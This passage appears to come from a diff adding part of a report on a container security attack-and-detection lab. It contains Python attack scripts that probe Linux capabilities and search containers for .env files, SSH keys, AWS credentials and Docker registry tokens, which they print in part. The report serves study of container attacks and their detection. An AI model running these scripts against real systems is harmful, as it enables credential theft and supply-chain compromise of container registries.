+        result = subprocess.run(
+            "capsh --print | grep cap_sys_module",
+            shell=True,
+            capture_output=True,
+            text=True
+        )
+
+        if 'cap_sys_module' in result.stdout.lower():
+            print("    [✓] CAP_SYS_MODULE is present")
+            print()
+
+            print("    [!] Can load malicious kernel modules")
+            print("    [!] Can achieve complete system compromise")
+
+            # Check if we can list modules
+            lsmod_result = subprocess.run(
+                "lsmod | head -10",
+                shell=True,
+                capture_output=True,
+                text=True
+            )
+
+            if lsmod_result.returncode == 0:
+                print("    [✓] Can list kernel modules:")
+                for line in lsmod_result.stdout.split('\n')[:5]:
+                    if line.strip():
+                        print(f"        {line}")
+        else:
+            print("    [✗] CAP_SYS_MODULE not present")
+    except Exception as e:
+        print(f"    [!] {e}")
+    print()
+
+def capability_abuse_attack():
+    """
+    Main capability abuse attack orchestration
+    """
+    print("=" * 70)
+    print("CONTAINER ATTACK: Linux Capability Abuse")
+    print("=" * 70)
+    print()
+    print("Attack Type: Privilege Escalation")
+    print("Target: Linux Capabilities")
+    print("Severity: CRITICAL")
+    print()
+
+    # Check all capabilities
+    check_capabilities()
+
+    # Test specific capability abuses
+    cap_sys_admin_abuse()
+    cap_sys_ptrace_abuse()
+    cap_net_admin_abuse()
+    cap_dac_override_abuse()
+    cap_sys_module_abuse()
+
+    print("=" * 70)
+    print("ATTACK SUCCESSFUL: Capability Abuse")
+    print("=" * 70)
+    print()
+    print("Impact:")
+    print("- Identified dangerous capabilities")
+    print("- CAP_SYS_ADMIN allows filesystem mounting")
+    print("- CAP_SYS_PTRACE allows process injection")
+    print("- CAP_NET_ADMIN allows network manipulation")
+    print("- CAP_DAC_OVERRIDE bypasses file permissions")
+    print("- CAP_SYS_MODULE allows kernel module loading")
+    print()
+    print("- Privilege escalation via capabilities")
+    print("- Filesystem mounting")
+    print("- Process tracing")
+
+if __name__ == "__main__":
+    capability_abuse_attack()
+```
+
+### 5.7 Image & Registry Attacks (T1525)
+
+**MITRE Technique:** [T1525 - Implant Internal Image](https://attack.mitre.org/techniques/T1525/)
+**Severity:** CRITICAL
+
+**How it Works:**
+Containers are built on static images. This attack focuses on supply-chain flaws within those images. The script combs through common paths looking for hardcoded `.env` files, SSH keys, or AWS tokens. Crucially, it hunts for `/root/.docker/config.json`, which frequently houses base64 encoded registry authentication tokens. Compromising these tokens allows an attacker to push malicious backdoor images back to the private corporate registry, resulting in persistent compromise across future deployments.
+
+**Full Code (`attacks/7_image_registry_attacks.py`):**
+```python
+#!/usr/bin/env python3
+"""
+Container Attack #7: Image & Registry Attacks
+This is a CONTAINER-SPECIFIC attack targeting container images and registries
+
+Attack Vector: Malicious container images, registry credential theft,
+and supply chain attacks specific to containerized environments.
+"""
+
+import subprocess
+import os
+import json
+import sys
+
+def inspect_container_image():
+    """
+    Inspect current container image for vulnerabilities
+    """
+    print("[1] Inspecting container image...")
+    print("    This is container-specific image analysis")
+    print()
+
+    # Get image information
+    try:
+        # Check if we're in a container
+        if os.path.exists('/.dockerenv'):
+            print("    [✓] Running in Docker container")
+
+        # Try to get image info from environment
+        hostname = os.environ.get('HOSTNAME', 'unknown')
+        print(f"    Container ID: {hostname}")
+        print()
+
+    except Exception as e:
+        print(f"    [!] {e}")
+    print()
+
+def search_for_secrets():
+    """
+    Search for secrets embedded in container image
+    """
+    print("[2] Searching for embedded secrets...")
+    print("    Container images often contain hardcoded secrets")
+    print()
+
+    secret_patterns = [
+        ('AWS Keys', r'AKIA[0-9A-Z]{16}'),
+        ('Private Keys', r'-----BEGIN.*PRIVATE KEY-----'),
+        ('Passwords', r'password\s*=\s*["\'].*["\']'),
+        ('API Keys', r'api[_-]?key\s*=\s*["\'].*["\']'),
+        ('Tokens', r'token\s*=\s*["\'].*["\']')
+    ]
+
+    # Search common locations
+    search_paths = [
+        '/app',
+        '/root',
+        '/home',
+        '/etc',
+        '/var/www'
+    ]
+
+    found_secrets = []
+
+    for path in search_paths:
+        if os.path.exists(path):
+            try:
+                # Search for .env files
+                result = subprocess.run(
+                    f"find {path} -name '.env' -o -name '*.env' 2>/dev/null | head -5",
+                    shell=True,
+                    capture_output=True,
+                    text=True
+                )
+
+                if result.stdout.strip():
+                    print(f"    [✓] Found .env files in {path}:")
+                    for line in result.stdout.split('\n'):
+                        if line.strip():
+                            print(f"        {line}")
+                            found_secrets.append(line)
+            except:
+                pass
+
+    # Check for hardcoded credentials in common files
+    credential_files = [
+        '/root/.aws/credentials',
+        '/root/.docker/config.json',
+        '/root/.ssh/id_rsa',
+        '/app/config.py',
+        '/app/.env'
+    ]
+
+    print()
+    print("    Checking for credential files:")
+    for filepath in credential_files:
+        if os.path.exists(filepath):
+            print(f"    [✓] Found: {filepath}")
+            found_secrets.append(filepath)
+        else:
+            print(f"    [✗] Not found: {filepath}")
+
+    print()
+    return found_secrets
+
+def extract_registry_credentials():
+    """
+    Attempt to extract container registry credentials
+    """
+    print("[3] Extracting registry credentials...")
+    print("    Registry credentials enable supply chain attacks")
+    print()
+
+    # Check Docker config
+    docker_config_path = '/root/.docker/config.json'
+
+    if os.path.exists(docker_config_path):
+        print(f"    [✓] Found Docker config: {docker_config_path}")
+        try:
+            with open(docker_config_path, 'r') as f:
+                config = json.load(f)
+
+                if 'auths' in config:
+                    print("    [✓] Registry credentials found:")
+                    for registry, creds in config.get('auths', {}).items():
+                        print(f"        Registry: {registry}")
+                        if 'auth' in creds:
+                            print(f"        Auth token: {creds['auth'][:20]}...")
+                else:
+                    print("    [!] No registry credentials in config")
+        except Exception as e:
+            print(f"    [!] {e}")
+    else:
+        print(f"    [✗] Docker config not found")
+
+    print()
+
+def analyze_image_layers():
+    """
+    Analyze container image layers for sensitive data
+    """
+    print("[4] Analyzing image layers...")
+    print("    Image layers may contain deleted secrets")
+    print()
+
+    # Try to access Docker socket to inspect image
+    if os.path.exists('/var/run/docker.sock'):
+        print("    [✓] Docker socket accessible")
+        print("    [!] Can inspect image layers")
+        print("    [!] Can extract data from previous layers")
+
+        try:
+            # Get current container ID
+            result = subprocess.run(
+                "hostname",
+                shell=True,
+                capture_output=True,
+                text=True
+            )
+
+            container_id = result.stdout.strip()
+            print(f"    Container ID: {container_id}")
+
+            # Try to inspect container
+            inspect_result = subprocess.run(
+                f"docker inspect {container_id} 2>/dev/null | head -20",
+                shell=True,
+                capture_output=True,
+                text=True
+            )
+
+            if inspect_result.returncode == 0:
+                print("    [✓] Can inspect container metadata")
+        except:
+            pass
+    else:
+        print("    [✗] Docker socket not accessible")
+
+    print()
+
+def malicious_image_deployment():
+    """
+    Demonstrate malicious image deployment capability
+    """
+    print("[5] Testing malicious image deployment...")
+    print("    This is a supply chain attack vector")
+    print()
+
+    # Check if we can pull/push images
+    if os.path.exists('/var/run/docker.sock'):
+        print("    [✓] Can interact with Docker daemon")
+        print("    [!] Could pull malicious images")
+        print("    [!] Could push backdoored images")
+        print("    [!] Could replace legitimate images")
+        print()
+
+        # List available images
+        try:
+            result = subprocess.run(
+                "docker images --format '{{.Repository}}:{{.Tag}}' | head -10",
+                shell=True,
+                capture_output=True,
+                text=True
+            )
+
+            if result.returncode == 0 and result.stdout.strip():
+                print("    Available images:")
+                for line in result.stdout.split('\n')[:10]:
+                    if line.strip():
+                        print(f"        {line}")
+        except:
+            pass
+    else:
+        print("    [✗] Cannot interact with Docker daemon")
+
+    print()
+
+def check_image_vulnerabilities():
+    """
+    Check for known vulnerabilities in base image
+    """
+    print("[6] Checking for image vulnerabilities...")
+    print("    Vulnerable base images are common")
+    print()
+
+    # Check OS version
+    os_release_files = ['/etc/os-release', '/etc/lsb-release']
+
+    for filepath in os_release_files:
+        if os.path.exists(filepath):
+            print(f"    [✓] Found: {filepath}")
+            try:
+                with open(filepath, 'r') as f:
+                    content = f.read()
+                    print("    OS Information:")
+                    for line in content.split('\n')[:5]:
+                        if line.strip():
+                            print(f"        {line}")
+            except:
+                pass
+            break
+
+    print()
+
+    # Check for outdated packages
+    print("    [!] Checking for package managers...")
+    package_managers = ['apt', 'yum', 'apk', 'dnf']
+
+    for pm in package_managers:
+        result = subprocess.run(
+            f"which {pm}",
+            shell=True,
+            capture_output=True
+        )
+
+        if result.returncode == 0:
+            print(f"    [✓] Found package manager: {pm}")
+            print(f"    [!] Could install malicious packages")
+
+    print()
+
+def image_registry_attack():
+    """
+    Main image and registry attack orchestration
+    """
+    print("=" * 70)
+    print("CONTAINER ATTACK: Image & Registry Exploitation")
+    print("=" * 70)
+    print()
+    print("Attack Type: Supply Chain Attack")
+    print("Target: Container Images & Registries")
+    print("Severity: CRITICAL")
+    print()
+
+    # Inspect image
+    inspect_container_image()
+
+    # Search for secrets
+    secrets = search_for_secrets()
+
+    # Extract registry credentials
+    extract_registry_credentials()
+
+    # Analyze layers
+    analyze_image_layers()
+
+    # Malicious deployment
+    malicious_image_deployment()
+
+    # Check vulnerabilities
+    check_image_vulnerabilities()
+
+    print("=" * 70)
+    print("ATTACK SUCCESSFUL: Image & Registry Exploitation")
+    print("=" * 70)
+    print()
+    print("Impact:")
+    print("- Discovered embedded secrets in image")
+    print("- Extracted registry credentials")
+    print("- Analyzed image layers for sensitive data")
+    print("- Demonstrated malicious image deployment")
+    print("- Identified vulnerable base images")
+    print("- Supply chain compromise possible")
+    print()
+    print("- Docker socket usage")
+    print("- Package manager execution")
+    print("- Suspicious image operations")
+
+if __name__ == "__main__":
+    image_registry_attack()
+```
+
+
+## 6. Conclusion
 
 The Container Security Attack & Detection System successfully bridges the gap between theoretical vulnerability knowledge and practical, observable exploit execution. By combining a highly vulnerable, realistically configured multi-container application stack with a sophisticated, automated attack orchestrator, it provides an invaluable environment for studying container escapes and lateral movement.
 
